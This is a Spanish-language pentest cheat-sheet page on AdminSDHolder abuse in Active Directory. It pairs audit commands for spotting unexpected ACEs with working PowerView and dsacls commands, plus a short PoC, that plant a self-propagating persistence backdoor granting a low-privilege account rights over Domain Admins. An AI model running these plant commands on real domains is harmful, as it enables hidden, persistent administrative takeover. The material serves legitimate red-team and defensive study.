---
aliases:
  - AdminSDHolder Plant
tags:
  - technique/persistence
  - asset/active-directory
  - env/windows
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AdminSDHolder Abuse]]"
---
# AdminSDHolder Abuse - Plantar y Auditar

> El DACL de `CN=AdminSDHolder,CN=System` es la plantilla que SDProp copia cada ~60 min a todos los objetos protegidos (`adminCount=1`). Modificarlo = backdoor self-healing. Plantarlo requiere **DA**.

---

## Auditar (Recon / Detección)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -ResolveGUIDs` | DACL actual de AdminSDHolder (detectar backdoors) | Auditoría / hunting. |
| `Get-DomainObjectAcl ... \| ? {$_.ActiveDirectoryRights -match 'GenericAll\|WriteDacl'}` | ACEs peligrosos sobre AdminSDHolder | Buscar principals no esperados. |
| `dsacls "CN=AdminSDHolder,CN=System,DC=corp,DC=local"` | DACL vía dsacls (RSAT) | Sin PowerView. |
^asdh-plant-audit

## Plantar el Backdoor (requiere DA)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -PrincipalIdentity lowpriv -Rights All` | `GenericAll` de `lowpriv` sobre AdminSDHolder | Plantar (PowerView). |
| `dsacls "CN=AdminSDHolder,CN=System,DC=corp,DC=local" /G corp\lowpriv:GA` | Igual con dsacls | Alternativa. |
| `Add-DomainObjectAcl ... -Rights ResetPassword` | Solo ForceChangePassword (más sutil que GenericAll) | Backdoor de menor perfil. |
| (en el DC) `secedit /refreshpolicy machine_policy` o esperar 60 min | Forzar/esperar la propagación SDProp | Confirmar que llegó a los DAs. |
^asdh-plant-set

### PoC

```powershell
# Plantar (como DA)
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' `
  -PrincipalIdentity lowpriv -Rights All
# SDProp propaga el permiso a Domain Admins / Tier 0 en ~60 min
```

---

> Abusar el permiso ya propagado: [[AdminSDHolder Abuse - Abuso del Permiso]].
